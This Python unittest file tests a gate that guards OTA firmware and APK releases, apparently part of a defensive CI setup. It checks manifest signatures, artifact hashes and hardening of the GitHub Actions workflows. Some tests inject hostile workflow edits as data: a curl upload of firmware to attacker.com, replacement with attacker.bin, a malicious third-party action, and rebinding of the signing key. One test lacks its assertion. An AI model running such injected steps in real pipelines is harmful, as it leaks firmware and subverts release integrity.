import base64
import copy
import hashlib
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

import ota_contract_gate as gate  # noqa: E402


TEST_PRIVATE_KEY_HEX = (
    "9d61b19deffd5a60ba844af492ec2cc4"
    "4449c5697b326919703bac031cae7f60"
)


class OtaContractGateTest(unittest.TestCase):
  def _workflow_sources(self) -> dict[str, str]:
    return {
        path: (gate.ROOT / path).read_text(encoding="utf-8")
        for path in gate.WORKFLOW_ARTIFACT_BINDINGS
    }

  def _write_release_fixture(
      self,
      directory: Path,
      artifact_type: str,
      artifact_bytes: bytes,
      write_artifact: bool = True,
  ) -> tuple[Path, Path, dict]:
    vector_name = (
        "target-valid.json"
        if artifact_type == "target-firmware"
        else "mobile-valid.json"
    )
    manifest = gate.load_json(gate.OTA / "test-vectors" / vector_name)
    manifest["sha256"] = hashlib.sha256(artifact_bytes).hexdigest()
    size_field = (
        "artifact_size" if artifact_type == "target-firmware" else "apk_size"
    )
    manifest[size_field] = len(artifact_bytes)
    if artifact_type == "android-apk":
      manifest["signing_certificate_digest"] = "a" * 64
    private_key = Ed25519PrivateKey.from_private_bytes(
        bytes.fromhex(TEST_PRIVATE_KEY_HEX)
    )
    manifest["signature"] = base64.b64encode(
        private_key.sign(gate.canonical_signed_bytes(manifest))
    ).decode("ascii")

    manifest_path = directory / "manifest.json"
    artifact_path = directory / (
        "firmware.bin" if artifact_type == "target-firmware" else "app.apk"
    )
    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
    if write_artifact:
      artifact_path.write_bytes(artifact_bytes)
    return manifest_path, artifact_path, manifest

  def test_contract_assets_and_dual_slot_pass(self):
    gate.validate_contract()

  def test_target_tamper_is_rejected(self):
    manifest = gate.load_json(gate.OTA / "test-vectors" / "target-valid.json")
    tampered = copy.deepcopy(manifest)
    tampered["sha256"] = "f" * 64
    with self.assertRaisesRegex(gate.GateError, "signature"):
      gate.validate_manifest(
          tampered, "target-manifest.schema.json", gate.TEST_PUBLIC_KEY_HEX
      )

  def test_mobile_fallback_must_be_independent(self):
    manifest = gate.load_json(gate.OTA / "test-vectors" / "mobile-valid.json")
    manifest["fallback_url"] = manifest["apk_url"]
    with self.assertRaisesRegex(gate.GateError, "fallback_url"):
      gate.validate_manifest(
          manifest, "mobile-manifest.schema.json", gate.TEST_PUBLIC_KEY_HEX
      )

  def test_pending_hardware_evidence_blocks_release(self):
    with self.assertRaisesRegex(gate.GateError, "incomplete gates"):
      gate.validate_release_evidence(gate.OTA / "release-evidence.json")

  def test_release_manifest_requires_matching_pinned_key(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory), "target-firmware", b"valid firmware bytes"
      )
      gate.validate_release_manifests(
          [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
      )
      with self.assertRaisesRegex(gate.GateError, "signature"):
        gate.validate_release_manifests([manifest], [artifact], "00" * 32)

  def test_release_missing_artifact_is_rejected(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory),
          "target-firmware",
          b"expected firmware bytes",
          write_artifact=False,
      )
      with self.assertRaisesRegex(gate.GateError, "missing or not a file"):
        gate.validate_release_manifests(
            [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
        )

  def test_release_artifact_byte_substitution_is_rejected(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory), "target-firmware", b"artifact-A"
      )
      artifact.write_bytes(b"artifact-B")
      with self.assertRaisesRegex(gate.GateError, "SHA-256"):
        gate.validate_release_manifests(
            [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
        )

  def test_release_artifact_truncation_is_rejected(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory), "target-firmware", b"complete artifact"
      )
      artifact.write_bytes(b"truncated")
      with self.assertRaisesRegex(gate.GateError, "byte length"):
        gate.validate_release_manifests(
            [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
        )

  def test_release_apk_certificate_mismatch_is_rejected(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory), "android-apk", b"signed apk bytes"
      )
      with mock.patch.object(
          gate,
          "read_apk_signing_certificate_digests",
          return_value={"b" * 64},
      ):
        with self.assertRaisesRegex(gate.GateError, "certificate digest"):
          gate.validate_release_manifests(
              [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
          )

  def test_release_apk_artifact_and_certificate_binding_passes(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory), "android-apk", b"signed apk bytes"
      )
      with mock.patch.object(
          gate,
          "read_apk_signing_certificate_digests",
          return_value={"a" * 64},
      ):
        gate.validate_release_manifests(
            [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
        )

  def test_state_preservation_and_invariant_arrays_cannot_be_empty(self):
    for component in ("target", "mobile"):
      for collection in ("failure_preserves", "invariants"):
        with self.subTest(component=component, collection=collection):
          document = gate.load_json(gate.OTA / "state-machines.json")
          document[component][collection] = []
          with self.assertRaisesRegex(gate.GateError, "schema validation"):
            gate.validate_state_machines(document)

  def test_required_state_preservation_or_invariant_cannot_be_removed(self):
    for component in ("target", "mobile"):
      for collection in ("failure_preserves", "invariants"):
        with self.subTest(component=component, collection=collection):
          document = gate.load_json(gate.OTA / "state-machines.json")
          document[component][collection].pop()
          with self.assertRaisesRegex(gate.GateError, "required set"):
            gate.validate_state_machines(document)

  def test_state_initial_and_terminal_success_are_fixed(self):
    document = gate.load_json(gate.OTA / "state-machines.json")
    document["target"]["initial"] = "WAIT_SAFE_STATE"
    with self.assertRaisesRegex(gate.GateError, "initial must be IDLE"):
      gate.validate_state_machines(document)
    document = gate.load_json(gate.OTA / "state-machines.json")
    document["mobile"]["terminal_success"] = "NEW_APP_FIRST_RUN_HEALTH"
    with self.assertRaisesRegex(gate.GateError, "terminal_success must be COMPLETE"):
      gate.validate_state_machines(document)

  def test_destructive_recovery_outcome_and_action_are_rejected(self):
    for field, destructive_text in (
        ("outcome", "installed-apk-erased"),
        ("action", "erase-installed-app"),
    ):
      with self.subTest(field=field):
        recovery = gate.load_json(gate.OTA / "recovery-matrix.json")
        recovery["rows"][0]["mobile"][field] = destructive_text
        with self.assertRaisesRegex(gate.GateError, "schema validation"):
          gate.validate_recovery_and_faults(recovery=recovery)

  def test_allowlisted_but_wrong_recovery_action_is_rejected(self):
    recovery = gate.load_json(gate.OTA / "recovery-matrix.json")
    recovery["rows"][0]["mobile"]["action"] = "retain-installed-apk"
    with self.assertRaisesRegex(gate.GateError, "required semantics"):
      gate.validate_recovery_and_faults(recovery=recovery)

  def test_unsafe_recovery_state_transition_is_rejected(self):
    recovery = gate.load_json(gate.OTA / "recovery-matrix.json")
    recovery["rows"][5]["target"]["to_state"] = "FAILED_RETRYABLE"
    with self.assertRaisesRegex(gate.GateError, "required semantics"):
      gate.validate_recovery_and_faults(recovery=recovery)

  def test_fault_outcome_semantic_inversion_is_rejected(self):
    plan = gate.load_json(gate.OTA / "fault-injection-plan.json")
    plan["tests"][0]["expected"] = "metadata-rejected"
    with self.assertRaisesRegex(gate.GateError, "not fail-safe"):
      gate.validate_recovery_and_faults(plan=plan)

  def test_workflow_cannot_upload_without_validating_same_artifact(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "--artifact dist/gatekeeper-firmware.bin",
        "--artifact dist/unbound-firmware.bin",
    )
    with self.assertRaisesRegex(gate.GateError, "artifact binding"):
      gate.validate_workflow_artifact_bindings(workflows)

  def test_push_builds_canary_without_entering_production_release_job(self):
    gate.validate_workflow_release_triggers(self._workflow_sources())

  def test_push_condition_cannot_authorize_production_release(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "github.event_name == 'workflow_dispatch' &&\n"
        "      inputs.release_target == 'production'",
        "github.event_name == 'push' && github.ref == 'refs/heads/main'",
    )
    with self.assertRaisesRegex(gate.GateError, "authorized production trigger"):
      gate.validate_workflow_release_triggers(workflows)

  def test_explicit_release_cannot_bypass_evidence_validation(self):
    workflows = self._workflow_sources()
    app_workflow = ".github/workflows/build_app.yml"
    workflows[app_workflow] = workflows[app_workflow].replace(
        "python scripts/ota_contract_gate.py release", "echo bypass-release-gate"
    )
    with self.assertRaisesRegex(gate.GateError, "release evidence validation"):
      gate.validate_workflow_release_triggers(workflows)

  def test_explicit_release_cannot_bypass_pinned_signing_trust(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
        '--public-key-hex "$UNTRUSTED_KEY"',
    )
    with self.assertRaisesRegex(gate.GateError, "production release isolation"):
      gate.validate_workflow_release_triggers(workflows)

  def test_release_condition_cannot_be_extended_with_push(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "inputs.release_target == 'production'",
        "inputs.release_target == 'production' || github.event_name == 'push'",
    )
    with self.assertRaisesRegex(gate.GateError, "exact production condition"):
      gate.validate_workflow_release_triggers(workflows)

  def test_evidence_step_cannot_be_conditionally_disabled(self):
    workflows = self._workflow_sources()
    app_workflow = ".github/workflows/build_app.yml"
    workflows[app_workflow] = workflows[app_workflow].replace(
        "      - name: Enforce OTA production release evidence\n",
        "      - name: Enforce OTA production release evidence\n"
        "        if: ${{ false }}\n",
    )
    with self.assertRaisesRegex(gate.GateError, "evidence step"):
      gate.validate_workflow_release_triggers(workflows)

  def test_signing_key_must_come_exactly_from_production_secret(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "OTA_SIGNING_PUBLIC_KEY_HEX: ${{ secrets.OTA_SIGNING_PUBLIC_KEY_HEX }}",
        f"OTA_SIGNING_PUBLIC_KEY_HEX: {gate.TEST_PUBLIC_KEY_HEX}",
    )
    with self.assertRaisesRegex(gate.GateError, "production signing secret"):
      gate.validate_workflow_release_triggers(workflows)

  def test_artifact_cannot_be_modified_after_release_validation(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "      - name: Deploy to Synology NAS via SFTP\n",
        "      - name: Replace validated firmware\n"
        "        run: cp attacker.bin dist/gatekeeper-firmware.bin\n\n"
        "      - name: Deploy to Synology NAS via SFTP\n",
    )
    with self.assertRaisesRegex(gate.GateError, "immutable release steps"):
      gate.validate_workflow_artifact_bindings(workflows)

  def test_firmware_and_apk_workflows_cover_pull_requests(self):
    for path, content in self._workflow_sources().items():
      with self.subTest(path=path):
        workflow = gate.load_workflow_yaml(path, content)
        self.assertIn("pull_request", workflow["on"])

  def test_build_job_cannot_use_production_environment(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "    name: Test and build firmware canary\n",
        "    name: Test and build firmware canary\n    environment: production\n",
    )
    with self.assertRaisesRegex(gate.GateError, "build job must not use production environment"):
      gate.validate_workflow_release_triggers(workflows)

  def test_release_job_cannot_have_step_after_sftp_deploy(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "          sftp_only: true\n",
        "          sftp_only: true\n\n      - name: Malicious post-deploy step\n        run: echo compromised\n",
    )
    with self.assertRaisesRegex(gate.GateError, "no steps allowed after SFTP deploy"):
      gate.validate_workflow_release_triggers(workflows)

  def test_release_job_needs_must_specify_build_job(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "    needs: test_and_build\n",
        "",
    )
    with self.assertRaisesRegex(gate.GateError, "needs must include"):
      gate.validate_workflow_release_triggers(workflows)

  def test_evidence_step_env_secret_override_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "OTA_SIGNING_PUBLIC_KEY_HEX: ${{ secrets.OTA_SIGNING_PUBLIC_KEY_HEX }}",
        "OTA_SIGNING_PUBLIC_KEY_HEX: ${{ secrets.SOME_OTHER_KEY }}",
    )
  def test_evidence_step_continue_on_error_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "      - name: Enforce OTA production release evidence\n",
        "      - name: Enforce OTA production release evidence\n        continue-on-error: true\n",
    )
    with self.assertRaisesRegex(gate.GateError, "continue-on-error"):
      gate.validate_workflow_release_triggers(workflows)

  def test_release_command_error_swallowing_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX" || true',
    )
    with self.assertRaisesRegex(gate.GateError, "swallow errors"):
      gate.validate_workflow_release_triggers(workflows)

  def test_signing_key_redefinition_in_run_script_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "        run: |\n",
        "        run: |\n          OTA_SIGNING_PUBLIC_KEY_HEX=attacker_key\n",
    )
    with self.assertRaisesRegex(gate.GateError, "redefined in run script"):
      gate.validate_workflow_release_triggers(workflows)

  def test_same_step_artifact_mutation_after_validation_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"\n          cp attacker.bin dist/gatekeeper-firmware.bin',
    )
    with self.assertRaisesRegex(gate.GateError, "alter artifacts after validation"):
      gate.validate_workflow_release_triggers(workflows)

  def test_sftp_local_path_rebinding_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "local_path: './dist/*'",
        "local_path: './unbound/*'",
    )
    with self.assertRaisesRegex(gate.GateError, "local_path must be strictly"):
      gate.validate_workflow_release_triggers(workflows)

  def test_duplicate_or_early_sftp_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "      - name: Enforce OTA production release evidence\n",
        "      - name: Early SFTP\n        uses: wlixcc/SFTP-Deploy-Action@v1.2.4\n      - name: Enforce OTA production release evidence\n",
    )
    with self.assertRaisesRegex(gate.GateError, "exactly one SFTP deploy step"):
      gate.validate_workflow_release_triggers(workflows)


  def test_object_form_build_environment_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "    name: Test and build firmware canary\n",
        "    name: Test and build firmware canary\n    environment:\n      name: production\n",
    )
    with self.assertRaisesRegex(gate.GateError, "must not use production environment|must not specify environment"):
      gate.validate_workflow_release_triggers(workflows)


  def test_same_line_evidence_error_swallowing_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX" || true',
        )
        with self.assertRaisesRegex(gate.GateError, "swallow errors"):
          gate.validate_workflow_release_triggers(workflows)

  def test_same_line_post_validation_artifact_replacement_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX" && cp attacker.bin dist/artifact',
        )
        with self.assertRaisesRegex(gate.GateError, "swallow errors|alter artifacts|flags mismatch"):
          gate.validate_workflow_release_triggers(workflows)

  def test_printf_or_read_signing_key_rebinding_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
            'printf -v OTA_SIGNING_PUBLIC_KEY_HEX "000"\n          --public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
        )
        with self.assertRaisesRegex(gate.GateError, "redefined in run script|flags mismatch"):
          gate.validate_workflow_release_triggers(workflows)

  def test_duplicate_evidence_step_identity_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "      - name: Enforce OTA production release evidence\n",
            "      - name: Enforce OTA production release evidence\n"
            "        run: python scripts/ota_contract_gate.py release --evidence ota/release-evidence.json --manifest dist/version.json --artifact dist/gatekeeper-firmware.bin --public-key-hex \"$OTA_SIGNING_PUBLIC_KEY_HEX\"\n"
            "      - name: Enforce OTA production release evidence\n",
        )
        with self.assertRaisesRegex(gate.GateError, "step count must be exactly|order violated"):
          gate.validate_workflow_release_triggers(workflows)

  def test_alternate_scp_sftp_action_variants_are_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "wlixcc/SFTP-Deploy-Action@v1.2.4",
            "appleboy/scp-action@master",
        )
        with self.assertRaisesRegex(gate.GateError, "uses mismatch"):
          gate.validate_workflow_release_triggers(workflows)

  def test_ordinary_build_job_curl_upload_file_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "    steps:\n",
            "    steps:\n      - name: Curl upload exfiltration\n        run: curl --upload-file dist/firmware.bin ftp://attacker.com/\n",
        )
        with self.assertRaisesRegex(gate.GateError, "production or SFTP deployment capability"):
          gate.validate_workflow_release_triggers(workflows)

  def test_arbitrary_unknown_action_uses_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "    steps:\n",
            "    steps:\n      - name: Unknown action\n        uses: hacker/malicious-action@v1\n",
        )
        with self.assertRaisesRegex(gate.GateError, "unallowed action"):
          gate.validate_workflow_release_triggers(workflows)

  def test_arbitrary_unknown_step_in_release_job_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "  release_to_production:\n",
            "  release_to_production:\n    # extra step\n",
        )
        # Add an extra step inside release_to_production steps
        workflows[target_workflow] = workflows[target_workflow].replace(
            "      - name: Checkout repository\n",
            "      - name: Extra unauthorized step\n        run: echo compromised\n      - name: Checkout repository\n",
        )
        with self.assertRaisesRegex(gate.GateError, "step count must be|order violated|name mismatch"):
          gate.validate_workflow_release_triggers(workflows)

  def test_unallowed_top_level_key_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = "env:\n  MALICIOUS: 'true'\n" + workflows[target_workflow]
        with self.assertRaisesRegex(gate.GateError, "top-level contains unallowed keys"):
          gate.validate_workflow_release_triggers(workflows)

  def test_unallowed_job_in_workflow_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "jobs:\n",
            "jobs:\n  extra_backdoor_job:\n    runs-on: ubuntu-latest\n    steps: []\n",
        )
        with self.assertRaisesRegex(gate.GateError, "unexpected job in workflow"):
          gate.validate_workflow_release_triggers(workflows)

  def test_unallowed_top_level_permissions_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "permissions:\n  contents: read",
            "permissions:\n  contents: write",
        )
        with self.assertRaisesRegex(gate.GateError, "top-level permissions must be exact mapping"):
          gate.validate_workflow_release_triggers(workflows)

  def test_unallowed_trigger_in_workflow_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "on:\n",
            "on:\n  schedule:\n    - cron: '* * * * *'\n",
            1
        )
        with self.assertRaisesRegex(gate.GateError, "workflow contains unallowed triggers"):
          gate.validate_workflow_release_triggers(workflows)

if __name__ == "__main__":
  unittest.main()
